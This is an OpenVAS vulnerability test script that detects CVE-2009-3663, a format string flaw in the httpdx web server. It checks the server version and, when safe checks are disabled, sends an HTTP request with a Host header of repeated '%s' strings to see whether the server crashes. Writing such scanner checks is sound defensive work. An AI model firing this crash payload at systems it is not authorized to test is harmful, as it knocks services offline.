###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_httpdx_web_server_format_string_vuln.nasl 9350 2018-04-06 07:03:33Z cfischer $
#
# httpdx 'h_readrequest()' Host Header Format String Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to crash an affected server or
  execute arbitrary code via a specially crafted request.
  Impact Level: Application";
tag_affected = "httpdx Web Server version 1.4 and prior on windows.";
tag_insight = "A format string error exists in the 'h_readrequest()' [httpd_src/http.cpp]
  function when processing the HTTP 'Host:' header.";
tag_solution = "Upgrade to httpdx Server version 1.4.1 or later
  http://sourceforge.net/projects/httpdx/";
tag_summary = "The host is running httpdx Web Server and is prone to Format String
  vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800961");
  script_version("$Revision: 9350 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2009-10-23 16:18:41 +0200 (Fri, 23 Oct 2009)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2009-3663");
  script_name("httpdx 'h_readrequest()' Host Header Format String Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36734");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9657");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2654");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_httpdx_server_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("httpdx/installed");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");

httpdxPort = get_http_port(default:80);

httpdxVer = get_kb_item("httpdx/" + httpdxPort + "/Ver");
if(isnull(httpdxVer)){
  exit(0);
}

if(!safe_checks())
{
  # Send the malicious string in Host header.
  sndReq = string('GET /',' HTTP/1.1\r\n',
                  'OpenVAS: deflate,gzip;q=0.3\r\n',
                  'Connection: OpenVAS, close\r\n',
                  'Host: ', crap(length: 32, data: "%s"), '\r\n',
                  'User-Agent: ', OPENVAS_HTTP_USER_AGENT, '\r\n\r\n');
  rcvRes = http_send_recv(port:httpdxPort, data:sndReq);
  rcvRes = http_send_recv(port:httpdxPort, data:sndReq);
  if(isnull(rcvRes))
  {
    security_message(httpdxPort);
    exit(0);
  }
}

# Check for versions prior to 1.4.1
if(version_is_less(version:httpdxVer, test_version:"1.4.1")){
  security_message(httpdxPort);
}
